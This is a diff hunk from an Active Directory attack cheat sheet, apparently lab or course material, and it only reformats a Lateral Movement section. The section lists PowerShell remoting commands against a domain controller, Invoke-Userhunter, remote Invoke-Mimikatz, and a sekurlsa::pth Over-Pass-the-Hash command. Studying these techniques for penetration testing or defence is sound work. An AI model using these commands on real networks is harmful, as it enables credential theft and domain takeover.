@@ -76,16 +76,16 @@ Invoke-Userhunter  -GroupName  "RDPUsers" : Find computers where a "RDPUsers" ha
 Invoke-Userhunter -CheckAccess : To confirm admin access
 ```
 ## Lateral Movement
-```
+
 - New-Pssession -Computername xz-dc.abc.local -Credential $cred : Will give new powershell session on computer xz-dc.abc.local , the variable "cred" contains the credential for the target machine.
 
 - Invoke-command -Scriptblock {whoami} -computername xz-dc.abc.local : It will execute command whoami on computer xz-dc.abc.local , for asking for credentiall add parameter -Credential.
 
 - Invoke-command -Scriptblock ${function:Invoke-Mimikatz}  -computername xz-dc.abc.local :  It will execute Invoke-Mimikatz function on target machine , if mimikatz is loaded into it.
 
--Invoke-Mimikatz -command '"sekurlsa::pth /user:studentx /domain:abc.local /ntlm: <ntlm hash of user studentx> /run:powershell.exe"' : This method is known as OverPasstheHash attack . This will open a new powershell process as studentx user.
+- Invoke-Mimikatz -command '"sekurlsa::pth /user:studentx /domain:abc.local /ntlm: <ntlm hash of user studentx> /run:powershell.exe"' : This method is known as OverPasstheHash attack . This will open a new powershell process as studentx user.
   
-``` 
+ 
 ## Privilege Escalation Using Kerberos
 
 - Find User Account Used as Service Account
